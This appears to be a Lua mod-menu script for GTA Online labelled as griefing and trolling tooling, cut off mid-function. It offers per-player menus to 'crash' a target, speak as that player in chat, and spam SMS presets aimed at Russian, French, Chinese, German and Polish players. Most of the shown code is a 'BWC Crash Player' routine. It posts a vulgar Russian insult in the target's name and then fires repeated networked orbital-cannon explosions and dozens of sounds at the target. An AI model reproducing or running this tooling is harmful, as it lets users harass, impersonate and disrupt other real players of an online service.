require("natives-1640181023")
util.keep_running()
local resource_dir = filesystem.resources_dir()


local resolves = {
	"ez",
    "Crash addiction satisfied"
}

wait = util.yield
joaat = util.joaat
alloc = memory.alloc
getTime = util.current_time_millis
create_tick_handler = util.create_tick_handler
vect = {
	['new'] = function(x, y, z)
		return {['x'] = x, ['y'] = y, ['z'] = z}
	end,
	['subtract'] = function(a, b)
		return vect.new(a.x-b.x, a.y-b.y, a.z-b.z)
	end,
	['add'] = function(a, b)
		return vect.new(a.x+b.x, a.y+b.y, a.z+b.z)
	end,
	['mag'] = function(a)
		return math.sqrt(a.x^2 + a.y^2 + a.z^2)
	end,
	['norm'] = function(a)
		local mag = vect.mag(a)
		return vect.div(a, mag)
	end,
	['mult'] = function(a, b)
		return vect.new(a.x*b, a.y*b, a.z*b)
	end, 
	['div'] = function(a, b)
		return vect.new(a.x/b, a.y/b, a.z/b)
	end, 
	['dist'] = function(a, b) --returns the distance between two vectors
		return vect.mag(vect.subtract(a, b) )
	end
}



function notification(message, color)
	HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)

	local picture = "CHAR_SOCIAL_CLUB"
	GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(picture, 0)
	while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(picture) do
		util.yield()
	end
	util.BEGIN_TEXT_COMMAND_THEFEED_POST(message)

	title = "PhoenixScript"
	if color == green or color == red then
		subtitle = "~u~Notification"
	elseif color == black then
		subtitle = "~c~Notification"
	else
		subtitle = "~u~Notification"
	end
	HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(picture, picture, true, 4, title, subtitle)

	HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
	util.log(message)
end


function draw_box(x, y, width, height, opacity)
    color = {}
    color["r"] = 0.07
    color["g"] = 0.07
    color["b"] = 0.07
    color["a"] = opacity - 0.02
    directx.draw_rect(x, y - 0.0015, width, height + 0.0015, color)
end

function marqee(text)
	local temp = text
    text = text:sub(2)
	return text .. temp:sub(1, 1)
end

function send_script_event(first_arg, receiver, args)
	table.insert(args, 1, first_arg)
	util.trigger_script_event(1 << receiver, args)
end










alloc = memory.alloc
GenerateFeatures = function(pid)
	parent1  = menu.list(menu.player_root(pid), "Blacklist" ,{}, "BlackList Player", function();end)
    menu.divider(menu.player_root(pid),"--- Len's Lua : Griefing/Trolling ---")
    parent2  = menu.list(menu.player_root(pid), "BWC V2 / Spam" ,{}, "Crash Crash Crash.", function();end)
	menu.divider(menu.player_root(pid),"--- Chat As Player and SMS Spam ---")
	local chat_as_player = menu.list(menu.player_root(pid), "Chat As Player", {"chatasplayer"}, "")
	parent3  = menu.list(chat_as_player, "Chat as Russian Player" ,{}, "Presets for trolling russian guys.", function();end)
	parent4  = menu.list(chat_as_player, "Chat as French Player" ,{}, "Presets for trolling french guys.", function();end)
	parent5  = menu.list(chat_as_player, "Chat as Chiness Player" ,{}, "Presets for trolling chiness guys.", function();end)
	parent6  = menu.list(chat_as_player, "Chat as German Player" ,{}, "Presets for trolling greman guys.", function();end)
	parent7  = menu.list(chat_as_player, "Chat as Polish Player" ,{}, "Presets for trolling poland guys.", function();end)
	local sms_spam = menu.list(menu.player_root(pid), "SMS Spam", {"SMS Spam"}, "")
	parent8  = menu.list(sms_spam, "Spam SMS Russian" ,{}, "Presets for trolling russian guys.", function();end)
	parent9  = menu.list(sms_spam, "Spam SMS French" ,{}, "Presets for trolling french guys.", function();end)
	parent10  = menu.list(sms_spam, "Spam SMS Chiness" ,{}, "Presets for trolling chiness guys.", function();end)
	parent11  = menu.list(sms_spam, "Spam SMS German" ,{}, "Presets for trolling greman guys.", function();end)
	parent12  = menu.list(sms_spam, "Spam SMS Polish" ,{}, "Presets for trolling poland guys.", function();end)
	parent13  = menu.list(sms_spam, "Spam SMS English" ,{}, "Presets for trolling poland guys.", function();end)

	menu.action(parent1, ">> Blacklist Player Crash/kick attemps", {"blacklistcrashattemps"}, "Use that option ON for add automaticly the crash attemps in the player history", function(on_click)
		local attacker = players.is_marked_as_attacker(pid)
		local moddermk = players.is_marked_as_modder(pid)
		local name = players.get_name(pid)
		if attacker then
			menu.trigger_commands("historyadd "..PLAYER.GET_PLAYER_NAME(pid).."")
			util.yield(2000)
			menu.trigger_commands("historyadd "..PLAYER.GET_PLAYER_NAME(pid).."")
			util.yield(2000)
			menu.trigger_commands("historynote"..PLAYER.GET_PLAYER_NAME(pid).." -- Player History X (Attacker) --")

			util.toast("Player Marked in Player History X")
		end
		if not attacker then
			util.toast("Player is not marked on attacker")
			util.stop_thread()
		end	
	end)

	menu.action(parent1, ">> Blacklist Player Modder/GOD", {"blacklistcrashattemps"}, "Use that option ON for add automaticly the crash attemps in the player history", function(on_click)
		local godmode = players.is_godmode(pid)
		local attacker = players.is_marked_as_attacker(pid)
		local moddermk = players.is_marked_as_modder(pid)
		local name = players.get_name(pid)
		if godmode then
			menu.trigger_commands("historyadd "..PLAYER.GET_PLAYER_NAME(pid).."")
			util.yield(2000)
			menu.trigger_commands("historyadd "..PLAYER.GET_PLAYER_NAME(pid).."")
			util.yield(2000)
			menu.trigger_commands("historynote"..PLAYER.GET_PLAYER_NAME(pid).." -- Player History X (Modder) --")
			util.toast("Player Marked in Player History X")
		end
		if moddermk then
			menu.trigger_commands("historyadd "..PLAYER.GET_PLAYER_NAME(pid).."")
			util.yield(2000)
			menu.trigger_commands("historyadd "..PLAYER.GET_PLAYER_NAME(pid).."")
			util.yield(2000)
			menu.trigger_commands("historynote"..PLAYER.GET_PLAYER_NAME(pid).." -- Player History X (Modder) --")
			util.toast("Player Marked in Player History X")
		end
		if not moddermk then
			util.toast("Player is not marked on Godmode or modder")
			util.stop_thread()
		end	
	end)
	menu.action(parent1, ">> Blacklist Player Legit", {"blacklistcrashattemps"}, "Use that option ON for add automaticly the crash attemps in the player history", function(on_click)
		menu.trigger_commands("historyadd "..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(2000)
		menu.trigger_commands("historyadd "..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(2000)
		menu.trigger_commands("historynote"..PLAYER.GET_PLAYER_NAME(pid).." -- Player Legit History X --")
		util.toast("Player Marked in Player Legit History X")

	end)

    menu.toggle_loop(parent2, ">> BWC Crash Player", {"attachallnearby"}, "be careful...", function(on)
		local countdown = 4.50	
		menu.trigger_commands("tpcayoperico")
		menu.trigger_commands("say "..PLAYER.GET_PLAYER_NAME(pid).." Твоя мама обрезается, когда сосет моего динозавра")
		if players.is_in_interior(pid) then
			return notification('The player is in interior', red)
		end
		local cam = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", false)
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		local height = pos.z + 200
		menu.trigger_commands('becomeorbitalcannon on')
		CAM.DO_SCREEN_FADE_OUT(500)
		util.yield(1000)
		CAM.SET_CAM_ROT(cam, -90, 0.0, 0.0, 2)
		CAM.SET_CAM_FOV(cam, 80)
		CAM.SET_CAM_COORD(cam, pos.x, pos.y, height)
		CAM.SET_CAM_ACTIVE(cam, true)
		CAM.RENDER_SCRIPT_CAMS(true, false, 3000, true, false, 0)
		STREAMING.SET_FOCUS_POS_AND_VEL(pos.x, pos.y, pos.z, 5.0, 0.0, 0.0)
		GRAPHICS.SET_SCRIPT_GFX_DRAW_ORDER(1)
		GRAPHICS.SET_DRAW_ORIGIN(pos.x, pos.y, pos.z, 0)
		GRAPHICS.ANIMPOSTFX_PLAY('MP_OrbitalCannon', 0, true)
		util.yield(1000)
		CAM.DO_SCREEN_FADE_IN(0)

		local scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE('ORBITAL_CANNON_CAM')
		while not GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleform) do
			util.yield()
		end
		
		local startTime = os.time()

		while true do
			util.yield()
			local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
			DRAW_LOCKON_SPRITE_ON_PLAYER(pid)

			CAM.SET_CAM_COORD(cam, pos.x, pos.y, height)
			HUD.DISPLAY_RADAR(false)

			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, 'SET_STATE')
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(3)
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, 'SET_ZOOM_LEVEL')
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(1.0)
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, 'SET_CHARGING_LEVEL')
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(1.0)
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
			
			if countdown > 0 then
				if os.difftime(os.time(), startTime) == 1 then
					countdown = countdown - 1
					startTime = os.time()
				end
				GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, 'SET_COUNTDOWN')
				GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(countdown)
				GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
			else
				GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, 'SET_CHARGING_LEVEL')
				GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.0)
				GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

				local effect = {['asset'] = 'scr_xm_orbital', ['name'] = 'scr_xm_orbital_blast'}
		
				STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)
				while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) do
					util.yield()
				end
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
